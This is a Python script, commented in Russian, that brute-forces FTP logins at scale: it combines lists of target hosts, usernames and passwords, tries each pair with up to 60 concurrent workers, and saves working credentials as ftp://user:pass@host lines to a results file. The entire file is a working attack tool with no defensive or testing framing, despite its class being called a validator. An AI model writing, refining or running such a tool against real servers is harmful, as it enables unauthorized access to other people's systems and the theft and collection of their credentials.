import asyncio
import ftplib
from colorama import Fore, Style
import colorama
import time

# Инициализация colorama
colorama.init()

class FTPValidator:
    def __init__(self):
        self.valid_credentials = {}  # Словарь для хранения валидных кредов по IP
        self.lock = asyncio.Lock()  # Асинхронная блокировка

    async def ftp_brute_force(self, host, username, password, results):
        """Асинхронная функция для попытки подключения к FTP"""
        
        async with self.lock:
            if host in self.valid_credentials:
                return False
        
        try:
            print(f'SELECT {host} | {username} | {password}')
            ftp = ftplib.FTP(host, timeout=10)
            ftp.login(username, password)
            ftp.voidcmd("NOOP")
            
            result = f"ftp://{username}:{password}@{host}"
            with open("FTP_results.txt", "a") as f:
                f.write(f"{result}\n")
            
            formatted_result = f"{Fore.WHITE}[{Fore.BLUE}{time.asctime()}{Fore.WHITE}][{Fore.CYAN}FTP{Fore.WHITE}]{Fore.GREEN}ftp://{username}:{password}@{host}{Fore.WHITE}"
            print(formatted_result)
            results.append(result)
            
            async with self.lock:
                self.valid_credentials[host] = (username, password)
                print(f"{Fore.YELLOW}✓ Found valid credentials for {host}. Moving to next target.{Style.RESET_ALL}")
            
            ftp.quit()
            return True
            
        except ftplib.error_perm:
            return False
        except Exception as e:
            return False

async def worker(target_queue, results, validator):
    """Асинхронная функция рабочего потока"""
    while not target_queue.empty():
        try:
            host, username, password = target_queue.get_nowait()
            async with validator.lock:
                if host in validator.valid_credentials:
                    target_queue.task_done()
                    continue 
            # Пытаемся подключиться
            await validator.ftp_brute_force(host, username, password, results)
            target_queue.task_done() 
        except Exception as e:
            print(f"{Fore.RED}Worker error: {e}{Style.RESET_ALL}")
            break

async def main():
    validator = FTPValidator()
    
    # Чтение целей
    targets = await read_file("targets.txt")
    users = await read_file("ftp_login_test.txt")
    passwords = await read_file("ftp_password_test.txt")

    print(f"{Fore.CYAN}Targets: {len(targets)}")
    print(f"Users: {len(users)}")
    print(f"Passwords: {len(passwords)}")
    print(f"Total combinations: {len(targets) * len(users) * len(passwords)}{Style.RESET_ALL}")

    target_queue = asyncio.Queue()
    results = []

    for host in targets:
        for username in users:
            for password in passwords:
                await target_queue.put((host, username, password))

    print(f"{Fore.GREEN}Total tasks in queue: {target_queue.qsize()}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Starting brute force with optimized async...{Style.RESET_ALL}")

    start_time = time.time()

    # Запуск рабочих задач
    tasks = []
    for _ in range(min(60, target_queue.qsize())):
        tasks.append(asyncio.create_task(worker(target_queue, results, validator)))

    await asyncio.gather(*tasks)

    end_time = time.time()
    elapsed_time = end_time - start_time

    # Вывод результатов
    print("\n" + "=" * 60)
    print(f"{Fore.CYAN}SCAN COMPLETED{Style.RESET_ALL}")
    print("=" * 60)
    print(f"{Fore.GREEN}Time elapsed: {elapsed_time:.2f} seconds{Style.RESET_ALL}")
    
    if results:
        print(f"{Fore.GREEN}SUCCESSFUL LOGINS: {len(results)}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}IPs with valid credentials: {len(validator.valid_credentials)}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}VALID CREDENTIALS:{Style.RESET_ALL}")
        for host, (user, pwd) in validator.valid_credentials.items():
            print(f"{Fore.GREEN}  {host} -> {user}:{pwd}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}No successful logins found.{Style.RESET_ALL}")

async def read_file(filename):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}File {filename} not found!{Style.RESET_ALL}")
        return []

if __name__ == "__main__":
    asyncio.run(main())
